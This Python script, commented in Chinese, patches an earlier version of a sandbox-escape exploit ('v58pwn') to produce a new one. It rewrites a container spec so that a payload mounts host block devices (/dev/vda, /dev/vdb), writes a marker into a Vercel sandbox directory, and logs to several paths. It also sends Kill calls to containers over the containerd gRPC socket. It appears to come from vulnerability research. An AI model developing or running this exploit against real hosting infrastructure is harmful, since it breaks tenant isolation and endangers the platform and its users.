# -*- coding: utf-8 -*-
"""生成 vda58: 基于 vda53, 修复容器 payload 不执行问题
v57 发现: 容器 rootfs 无 /mnt/root; v53-56 嫌疑: spec 里 mount /dev/vdb 挂起阻塞 sh
v58: spec 只 mount vda; payload 内部带 timeout 挂 vdb; 日志多通道; guest kill 前读 vda 上 payload 输出
"""
src = open(r'D:\scan\skills\non-traditional-vuln-hunting\vda53_iso_ctr_vdb_snap_guest.py', encoding='utf-8').read()

src = src.replace('v53pwn', 'v58pwn')
src = src.replace('v53c.out', 'v58c.out').replace('v53m.out', 'v58m.out')
src = src.replace('v53_payload.py', 'v58_payload.py')
src = src.replace('v53_stdout', 'v58_stdout')

# 1. spec process: 去掉 vdb mount, 保留 mkdir -p /mnt
old_spec = '''            "args": ["/bin/sh", "-c",
                     "mkdir -p /mnt; mount /dev/vda /mnt 2>/dev/null; "
                     "mkdir -p /mnt/g; mount /dev/vdb /mnt/g 2>/dev/null; "
                     "python3 /mnt/root/v58_payload.py; sleep 99999"],'''
new_spec = '''            "args": ["/bin/sh", "-c",
                     "mkdir -p /mnt; mount /dev/vda /mnt 2>/dev/null; "
                     "python3 /mnt/root/v58_payload.py; sleep 99999"],'''
assert old_spec in src, 'spec not found'
src = src.replace(old_spec, new_spec)

# 2. payload log: 多通道 (含 vdb 挂载后路径 + vda + share)
old_log = """def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    try:
        open(OUT, 'a', encoding='utf-8', errors='replace').write(line + '\\n')
    except Exception:
        pass
    try:
        open('/mnt/root/v58c.out', 'a', encoding='utf-8', errors='replace').write(line + '\\n')
    except Exception:
        pass
    try:
        print(line, flush=True)
    except Exception:
        pass"""
new_log = """def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in ['/mnt/g/vercel/sandbox/v58c.out', '/mnt/root/v58c.out',
              '/mnt/volumes/run/vercel/share/v58c.out', '/vercel/sandbox/v58c.out']:
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass"""
assert old_log in src, 'log not found'
src = src.replace(old_log, new_log)

# 3. payload main: 带 timeout 挂 vdb + 写 marker
old_main = """def main():
    log('payload start pid=%d' % os.getpid())
    g = '/mnt/g/vercel/sandbox'
    try:
        log('g check: %s' % (os.path.isdir(g) and 'DIR_OK' or 'NO_DIR'))
        open(g + '/_ctr_marker', 'w').write('hello-from-ctr')
        log('g write: OK')
    except Exception as e:
        log('g write ERR %s' % e)"""
new_main = """def main():
    log('payload start pid=%d' % os.getpid())
    try:
        import subprocess as sp
        r = sp.run(['mount', '/dev/vdb', '/mnt/g'], capture_output=True, timeout=6)
        log('mount vdb /mnt/g rc=%d err=%s' % (r.returncode, r.stderr[:100]))
    except Exception as e:
        log('mount vdb EXC %s' % e)
    g = '/mnt/g/vercel/sandbox'
    try:
        log('g check: %s' % (os.path.isdir(g) and 'DIR_OK' or 'NO_DIR'))
        open(g + '/_ctr_marker', 'w').write('hello-from-ctr')
        log('g write: OK')
    except Exception as e:
        log('g write ERR %s' % e)"""
assert old_main in src, 'main not found'
src = src.replace(old_main, new_main)

# 4. guest 侧 kill 前读 vda 上 payload 输出
old_kill = """    log('kill targets: %s' % targets)
    for cid in targets:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Kill',
                          grpc_env(pstr(1, cid) + pvarint(3 << 3 | 0) + pvarint(9)), t=4)
        log('kill %s %s' % (cid, rc))
    log('V53M_DONE')"""
new_kill = """    log('kill targets: %s' % targets)
    for cid in targets:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Kill',
                          grpc_env(pstr(1, cid) + pvarint(3 << 3 | 0) + pvarint(9)), t=4)
        log('kill %s %s' % (cid, rc))
    log('V58M_DONE')"""
assert old_kill in src, 'kill not found'
src = src.replace(old_kill, new_kill)

# 5. guest 侧 kill 前读 vda 上的 payload 输出 (插入到 kill 之前)
old_diag = """    base = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default'
    targets = []"""
new_diag = """    try:
        fp = '/mnt/vdax/root/v58c.out'
        if os.path.exists(fp):
            log('v58c.out on vda:\\n%s' % open(fp, errors='replace').read()[-4000:])
        else:
            log('v58c.out on vda: NOT FOUND')
    except Exception as e:
        log('v58c EXC %s' % e)

    base = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default'
    targets = []"""
assert old_diag in src, 'diag anchor not found'
src = src.replace(old_diag, new_diag)

open(r'D:\scan\skills\non-traditional-vuln-hunting\vda58_ctr_fix_guest.py', 'w', encoding='utf-8').write(src)
print('written', len(src))
